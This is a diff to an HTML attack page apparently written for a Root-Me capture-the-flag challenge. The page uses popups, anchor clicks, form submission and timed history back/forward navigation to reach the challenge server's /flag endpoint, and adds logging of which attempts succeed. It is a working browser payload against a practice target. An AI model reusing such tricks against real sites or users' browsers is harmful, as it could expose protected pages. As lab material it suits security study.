@@ -1,34 +1,39 @@
 <!doctype html>
 <html>
-<body>
+<body style="font-family: monospace">
+<div id="log">start</div>
 <script>
 const T = "http://challenge01.root-me.org:58007/flag";
+const L = (m) => document.getElementById("log").innerHTML += "<br>"+m;
 
-// try 1: window.open
-try { window.open(T, "_blank", "noopener,noreferrer"); } catch(e) {}
+// 1) Check popup capability
+let w = null;
+try { w = window.open("about:blank", "_blank"); } catch(e) {}
+L("popup=" + (w ? "opened" : "blocked"));
 
-// try 2: anchor click
-const a = document.createElement("a");
-a.href = T;
-a.target = "_blank";
-a.rel = "noopener noreferrer";
-document.body.appendChild(a);
-a.click();
+if (w) {
+  try { w.location = T; L("popup->/flag"); } catch(e) { L("popup nav err"); }
+}
 
-// try 3: form target blank
-const f = document.createElement("form");
-f.method = "GET";
-f.action = T;
-f.target = "_blank";
-document.body.appendChild(f);
-f.submit();
+// 2) Alternate new-context attempts
+try {
+  const a = document.createElement("a");
+  a.href = T; a.target = "_blank"; a.rel = "noopener noreferrer";
+  document.body.appendChild(a); a.click(); L("anchor click");
+} catch(e) { L("anchor err"); }
 
-// now force main tab through history/cache path
-setTimeout(() => { location.href = T; }, 300);
-setTimeout(() => { location.href = "http://challenge01.root-me.org:58007/"; }, 800);
-setTimeout(() => { history.back(); }, 1300);   // back to /flag from history/bfcache
-setTimeout(() => { history.forward(); }, 1700);
-setTimeout(() => { history.back(); }, 2100);
+try {
+  const f = document.createElement("form");
+  f.method = "GET"; f.action = T; f.target = "_blank";
+  document.body.appendChild(f); f.submit(); L("form submit");
+} catch(e) { L("form err"); }
+
+// 3) Main-tab history churn
+setTimeout(() => { location.href = T; }, 400);
+setTimeout(() => { location.href = "http://challenge01.root-me.org:58007/"; }, 900);
+setTimeout(() => { history.back(); }, 1400);
+setTimeout(() => { history.forward(); }, 1800);
+setTimeout(() => { history.back(); }, 2200);
 </script>
 </body>
 </html>
